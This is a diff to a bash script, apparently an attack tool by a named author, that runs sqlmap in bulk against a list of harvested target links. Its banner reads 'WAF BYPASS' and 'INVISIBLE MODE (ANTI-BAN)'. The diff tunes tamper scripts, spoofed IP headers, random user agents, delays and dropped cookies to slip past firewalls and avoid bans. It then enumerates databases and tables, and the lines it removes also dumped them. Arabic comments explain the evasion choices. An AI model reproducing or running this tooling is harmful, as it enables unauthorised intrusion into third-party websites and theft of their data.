@@ -14,9 +14,8 @@ banner() {
     echo "    █████   ██████  ███████ ███████ ██ "
     echo "    ██      ██   ██      ██ ██   ██ ██ "
     echo "    ██      ██   ██ ███████ ██   ██ ███████ "
-    echo -e "    ${Y}   WAF BYPASS (NO PROXY) | BY: FASIAL${NC}"
+    echo -e "    ${Y}   INVISIBLE MODE (ANTI-BAN) | BY: FASIAL${NC}"
     echo -e "    ${G}GitHub: https://github.com/f-a2${NC}"
-    echo -e "    ${G}Site: https://d7.ct.ws/f.html?i=2${NC}"
     echo -e "    ${R}--------------------------------------------${NC}"
 }
 
@@ -35,35 +34,30 @@ if [ ! -s final_targets.txt ]; then
 fi
 
 echo -e "${G}[+] Found $(wc -l < final_targets.txt) potential links.${NC}"
-echo -e "${Y}[!] Starting High-Level Bypass Attack...${NC}"
+echo -e "${Y}[!] Starting Invisible Bypass Attack (Slow & Steady)...${NC}"
 
-# الأمر الذهبي لتخطي الحماية بدون بروكسي
-# أضفنا --drop-set-cookie لتجنب تتبع الجلسة من الـ WAF
+# التعديلات الجديدة لتجنب الحظر والـ Timeout:
+# 1. شلنا charlike اللي سبب خطأ.
+# 2. حطينا --delay=3 عشان السيرفر ما يشك.
+# 3. حطينا --threads=1 (الفحص الفردي أضمن لتخطى الـ WAF).
+# 4. زدنا الـ --timeout لـ 60 ثانية.
+
 sqlmap -m final_targets.txt --batch --random-agent \
---tamper=between,charlike,randomcase,space2comment,union2comment,versionedmorekeywords,equaltolike \
+--tamper=between,randomcase,space2comment,union2comment,equaltolike \
 --header="X-Forwarded-For: 8.8.8.8" \
 --header="X-Originating-IP: 1.1.1.1" \
---header="X-Remote-IP: 127.0.0.1" \
---header="X-Client-IP: 127.0.0.1" \
---level=5 --risk=3 --threads=4 --delay=0.5 \
+--level=3 --risk=1 \
+--threads=1 --delay=3 --timeout=60 \
 --drop-set-cookie --dbs --output-dir="./results_$target"
 
 # التفاعل مع النتائج
 while true; do
-    echo -e "\n${Y}[1] Show Databases & Continue | [0] Exit${NC}"
+    echo -e "\n${Y}[1] Explore DBs | [0] Exit${NC}"
     read -p "> " choice
     if [ "$choice" == "1" ]; then
-        echo -e "${C}Enter the Database Name you want to explore:${NC}"
-        read dbname
-        sqlmap -m final_targets.txt --batch --random-agent -D $dbname --tables
-        echo -e "${Y}[?] Do you want to DUMP a table? (y/n)${NC}"
-        read -p "> " dmp
-        if [ "$dmp" == "y" ]; then
-            echo -e "${C}Enter Table Name:${NC}"
-            read tname
-            sqlmap -m final_targets.txt --batch --random-agent -D $dbname -T $tname --dump
-        fi
+        read -p "Enter DB Name: " dbname
+        sqlmap -m final_targets.txt --batch --random-agent -D $dbname --tables --threads=1 --delay=2
     else
-        echo -e "${G}Happy Hacking! Exiting...${NC}"; exit 0
+        exit 0
     fi
 done
